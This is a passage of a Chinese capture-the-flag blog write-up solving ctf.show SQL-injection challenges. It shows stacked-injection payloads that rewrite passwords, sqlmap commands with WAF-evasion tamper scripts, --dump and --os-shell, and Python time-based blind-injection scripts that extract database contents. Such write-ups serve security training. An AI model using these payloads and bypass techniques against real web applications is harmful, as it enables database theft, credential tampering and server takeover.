punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"登陆成功 flag is $flag"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">payload="0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围sql = "select pass from ctfshow_user where username = {$username};";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>admin</code> &lt;=&gt; <code>0x61646d696e</code></p><p><code>111</code>&lt;=&gt;<code>0x313131</code></p><h1 id="web196——bug题目"><a href="#web196——bug题目" class="headerlink" title="web196——bug题目"></a>web196——bug题目</h1><p>关键之处：<code>$row[0]==$password</code></p><p><code>uname：1;select(666)</code></p><p><code>passwd：666</code></p><h1 id="web197-198——堆叠注入、修改列名"><a href="#web197-198——堆叠注入、修改列名" class="headerlink" title="web197-198——堆叠注入、修改列名"></a>web197-198——堆叠注入、修改列名</h1><p>通过把密码列与id互换之后，降低密码的爆破难度，实现简单爆破密码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>    <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># username=0;show tables;</span><span class="token comment" spellcheck="true"># pass=ctfshow_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>非常机智的做法</p><h1 id="开始系统练习sqlmap的使用"><a href="#开始系统练习sqlmap的使用" class="headerlink" title="开始系统练习sqlmap的使用"></a>开始系统练习sqlmap的使用</h1><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//代码过于简单，不宜展示</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>需要学会：</strong></p><pre class="line-numbers language-php"><code class="language-php"> 使用<span class="token operator">--</span>user<span class="token operator">-</span>agent 指定agent <span class="token operator">--</span>user<span class="token operator">-</span>agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span> 使用<span class="token operator">--</span>referer 绕过referer检查 <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token string">"ctf.show"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161457844.png" alt="image-20210806161457844"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161954869.png" alt></p><h1 id="web202——post方法"><a href="#web202——post方法" class="headerlink" title="web202——post方法"></a>web202——post方法</h1><p><strong>使用–data 调整sqlmap的请求方式，主要针对post传参，也可以先burp抓包用-r a.txt来实现sqlmap</strong></p><p><code>--data=&quot;id=1&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806184447194.png" alt></p><h1 id="web203——put方法"><a href="#web203——put方法" class="headerlink" title="web203——put方法"></a>web203——put方法</h1><pre><code>使用--method 调整sqlmap的请求方式--method=&quot;xxx&quot;强制使用给定的HTTP方法(例如：PUT)使用--method=&quot;PUT&quot;时，需要加上--headers=&quot;Content-Type: text/plain&quot;否则是按表单提交的，put接收不到</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807203607411.png" alt></p><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><pre><code> 使用--cookie 提交cookie数据 --cookie=&quot;xx=xx&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807205057245.png" alt></p><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><p>提示：<strong>api调用需要鉴权</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807220923417.png" alt></p><p>也就是因为这个的原因，所以需要设置<code>--safe-url和--safe-freq</code>，因为抓包发现，每次访问<code>index.php</code>前都会先访问<code>getToken.php</code>才能行</p><p><strong><code>--safe-url 设置在测试目标地址前访问的安全链接</code><br><code>--safe-freq 设置两次注入测试前访问安全链接的次数</code></strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807221310654.png" alt></p><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><pre class="line-numbers language-php"><code class="language-php">sql需要闭合<span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"') limit 0,1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sqlmap能自动进行闭合操作</p><p><code>python sqlmap.py -u http://.challenge.ctf.show:8080/api/index.php --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 -D &quot;ctfshow_web&quot; -T ctfshow_flaxc -C flagv --dump</code></p><h1 id="web207——sqlmap中tamper的使用"><a href="#web207——sqlmap中tamper的使用" class="headerlink" title="web207——sqlmap中tamper的使用"></a>web207——sqlmap中tamper的使用</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用tamper脚本修改注入数据:</strong><br><code>sqlmap -u &quot;xxx&quot; --tamper &#39;脚本名&#39;</code></p><pre><code>常见的tamper有：apostrophemask.py     用utf8代替引号equaltolike.py         MSSQL * SQLite中like 代替等号greatest.py         MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号space2hash.py         空格替换为#号 随机字符串 以及换行符space2comment.py    用/**/代替空格apostrophenullencode.py     MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号halfversionedmorekeywords.py     当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py      MySQL中空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.p      Microsoft Access在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py      MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤space2mssqlblank.py  mssql空格替换为其它空符号base64encode.py      用base64编码space2mssqlhash.py mssql查询中替换空格modsecurityversioned.py     mysql中过滤空格，包含完整的查询版本注释space2mysqlblank.py      mysql中空格替换其它空白符号between.py              MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）space2mysqldash.py      MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py      围绕SQL关键字添加多个空格space2plus.py            用+替换空格bluecoat.py           MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为likenonrecursivereplacement.py      双重查询语句。取代predefined SQL关键字with表示 suitable for替代space2randomblank.py      代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py           追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾chardoubleencode.py      双url编码(不处理以编码的)unionalltounion.py           替换UNION ALL SELECT UNION SELECTcharencode.py           Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；randomcase.py           Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写unmagicquotes.py      宽字符绕过 GPC addslashesrandomcomments.py      用/**/分割sql关键字charunicodeencode.py      ASP，ASP.NET中字符串 unicode 编码securesphere.py       追加特制的字符串versionedmorekeywords.py          MySQL &gt;= 5.1.13注释绕过halfversionedmorekeywords.py      MySQL &lt; 5.1中关键字前加注释</code></pre><p>这里使用<code>space2comment</code>这个脚本，用<code>/**/</code>代替空格</p><p><code>python sqlmap.py -u &quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/index.php&quot; --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=vv1lcq36ru3v3hnu9qsk4mllub&quot; --method=&quot;PUT&quot; -headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/getToken.php&quot; --safe-freq=1 --tamper=space2comment.py --dump</code></p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span><span class="token comment" spellcheck="true">// $id = str_replace('select', '', $id);</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤关键词，可以<strong>大小写</strong>绕过，用到<code>randomcase.py</code>，同时<code>space2comment.py</code>也得用上<code>--tamper=randomcase.py,space2comment.py</code></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812191229483.png" alt="image-20210812191229483"></p><p>这里是利用的/**/来代替的空格，但是此题被waf挡住了，我们换%0a，%09都可以<code>--tamper=&quot;tamper/space2comment.py&quot;</code></p><p>然后针对=的过滤，需要添加以下内容：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="web210-212"><a href="#web210-212" class="headerlink" title="web210-212"></a>web210-212</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对查询字符进行解密</span>  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对你输入的id有解密处理，所以需要自行加密，同时对返回值过滤空格*号，需要用%09来代替即可</p><p><code>--tamper=web212</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812221751652.png" alt></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> xrange<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token operator">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web213——os-shell"><a href="#web213——os-shell" class="headerlink" title="web213——os-shell"></a>web213——os-shell</h1><pre class="line-numbers language-php"><code class="language-php">练习使用<span class="token operator">--</span>os<span class="token operator">-</span>shell 一键getshell<span class="token comment" spellcheck="true">//对查询字符进行解密</span>  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>原理大致是：</strong><br>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下，之后再上传一个文件，这个文件可以用来执行系统命令，并且将结果返回出来</p><p><strong>os-shell的使用条件</strong><br>（1）网站必须是root权限<br>（2）攻击者需要知道网站的绝对路径<br>（3）GPC为off，php主动转义的功能关闭</p><h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>有两个post注入点：ip&amp;debug</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/13 20:01</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://42ef38fd-35c5-4cb5-ae0a-658cbd6d58e2.challenge.ctf.show:8080/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查库名</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># 查表名字</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># 查列名字-id.flag</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment" spellcheck="true"># 查数据</span>        <span class="token comment" spellcheck="true"># payload = "select flaga from ctfshow_flagx"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1)"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>闭合单引号即可：</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1) and '1'='1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">       where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>需要闭合</strong></p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"'MQ==') or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>最终格式</strong></p><pre class="line-numbers language-php"><code class="language-php">where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">{</span>i<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">{</span>mid<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token 